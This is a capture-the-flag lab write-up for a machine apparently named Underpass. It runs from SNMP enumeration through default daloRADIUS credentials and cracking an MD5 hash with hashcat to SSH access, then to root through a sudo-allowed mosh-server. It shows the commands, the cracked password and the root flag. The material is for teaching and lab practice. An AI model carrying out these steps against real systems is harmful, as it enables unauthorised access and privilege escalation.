Reconnaissance

Only a default Apache page — no web app, no obvious attack surface. Don't stop here.

UDP Scan — The Critical SNMP Port

$ sudo nmap -sU --top-ports 100 -T4 10.129.231.213
PORT    STATE SERVICE
161/udp open  snmp
Why scan UDP? TCP scans only cover half the picture. SNMP (UDP 161) is one of the most common information leakers — it exposes process lists, software versions, network config, and sometimes even passwords in command-line arguments. The default community string public works on a shocking number of real-world devices.

SNMP Enumeration

$ snmpwalk -v 2c -c public 10.129.231.213 -On > snmp_full.txt 2>/dev/null

# Search for interesting strings
$ grep -i "dalo\|radius\|underpass\|pass" snmp_full.txt

SNMP output reveals daloRADIUS and the hostname underpass.htb.

$ echo "10.129.231.213 underpass.htb" | sudo tee -a /etc/hosts
Phase 1

Initial Access — daloRADIUS Default Credentials → MD5 Crack → SSH

daloRADIUS Operator Login

What is daloRADIUS? An open-source web frontend for RADIUS (Remote Authentication Dial-In User Service) — the protocol ISPs and enterprises use for WiFi/VPN authentication and billing. Think of it as "the admin panel for managing who can connect to the network." It has two login portals: one for regular users and one for operators (admins). 
# Operator (admin) portal:
http://underpass.htb/daloradius/app/operators/login.php

# Default credentials:
administrator : radius

Extract User Hash

In the admin panel under user management, find user svcMosh with an MD5 password hash:

Username: svcMosh
Password: 412DD4759978ACFCC81DEAB01B382403

Crack MD5

$ echo '412DD4759978ACFCC81DEAB01B382403' > hash.txt
$ hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
412dd4759978acfcc81deab01b382403:underwaterfriends

SSH → User Flag

$ ssh svcMosh@underpass.htb

Phase 2

Privilege Escalation — sudo mosh-server

Sudo Enumeration

svcMosh@underpass:~$ sudo -l
User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
What is mosh and why does it give root? mosh (Mobile Shell) is an SSH alternative designed for mobile/high-latency networks. It works over UDP and handles disconnects gracefully. The key is how it starts: mosh-server launches a new shell session as whoever runs it. Normally that's your own user, but with sudo it runs as root — so the session it creates is a root shell. The mosh client's --server parameter specifies the command to run on the remote side, and it's passed directly to the shell — so we inject sudo /usr/bin/mosh-server.

One Command Root Shell

svcMosh@underpass:~$ mosh --server="sudo /usr/bin/mosh-server" localhost

root@underpass:~# whoami
root

root@underpass:~# cat root.txt
cd9f7b68ae4deab3586609ddb0b6c9b3
GTFOBins-class escalation This is the same pattern as sudo vim → :!bash, or sudo find -exec /bin/bash. Any program that can spawn an interactive session, when run as root via sudo, becomes a root shell. mosh-server is a less common but equally effective example. Always cross-reference sudo -l output against GTFOBins.
Appendix

Key Takeaways

Always scan UDP — SNMP is a goldmine.

TCP-only scans miss critical services. SNMP on UDP 161 with default community public leaks process lists, software versions, and sometimes credentials.

Default credentials are still everywhere.

daloRADIUS ships with administrator:radius. Always try known defaults before brute-forcing — check SecLists' default-passwords lists and vendor documentation.

RADIUS stores passwords as weak hashes.

MD5 without salt is trivially crackable. RADIUS user databases are high-value targets because the hashes are often in rockyou.

mosh-server with sudo = instant root.

Like vim, find, and less, mosh-server spawns interactive sessions as the running user. With NOPASSWD sudo, mosh --server="sudo mosh-server" localhost gives root in one command.

Audit every sudo entry against GTFOBins.

Even obscure binaries like mosh-server can be escalation vectors. If a program can start a process, read files, or write files — and it's in sudo — it's likely exploitable.
